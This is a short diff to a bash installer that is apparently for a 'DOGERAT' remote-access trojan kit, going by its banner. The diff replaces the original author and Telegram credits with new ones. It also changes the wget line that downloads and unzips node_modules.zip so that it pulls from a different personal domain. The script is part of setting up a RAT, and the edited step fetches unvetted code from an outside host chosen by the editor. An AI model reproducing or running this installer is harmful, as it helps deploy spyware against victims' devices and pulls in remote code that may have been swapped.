@@ -16,13 +16,13 @@ echo -e "██║░░██║██║░░██║██║░░██�
 echo -e "██║░░██║██║░░██║██║░░╚██╗██╔══╝░░██╔══██╗██╔══██║░░░██║░░░"
 echo -e "██████╔╝╚█████╔╝╚██████╔╝███████╗██║░░██║██║░░██║░░░██║░░░"
 echo -e "╚═════╝░░╚════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░${RESET}"
-echo -e "${YELLOW}               ░D░O░G░E░ ░R░A░T░B░Y░S░ ░H░I░V░ ░A░Y░A░D░A░V░${RESET}"
+echo -e "${YELLOW}               ░D░O░G░E░ ░R░A░T░B░Y░B░A░S░H░A░R░Z░A░H░W░A░N░${RESET}"
 
 
 echo -e "\e[0m"
-echo "Author: shivayadv"
-echo "Github: shivaya-dav"
-echo "Telegram channel: cybershieldx"
+echo "Author: Bashar_Zahwan"
+echo "Github: Bashar_Zahwan"
+echo "Telegram channel: Bashar_Zahwan"
 echo -n "Loading "
 timeout 10s bash -c '
 while true
@@ -59,7 +59,7 @@ else
         echo "node_modules.zip already downloaded. Skipping download."
     else
         # Download node_modules.zip file
-        wget https://cybershieldx.com/node_modules.zip || { echo "Failed to download node_modules.zip" ; exit 1; }
+        wget https://Bashar_Zahwan.com/node_modules.zip || { echo "Failed to download node_modules.zip" ; exit 1; }
     fi
 
     unzip node_modules.zip || { echo "Failed to extract node_modules.zip" ; exit 1; }
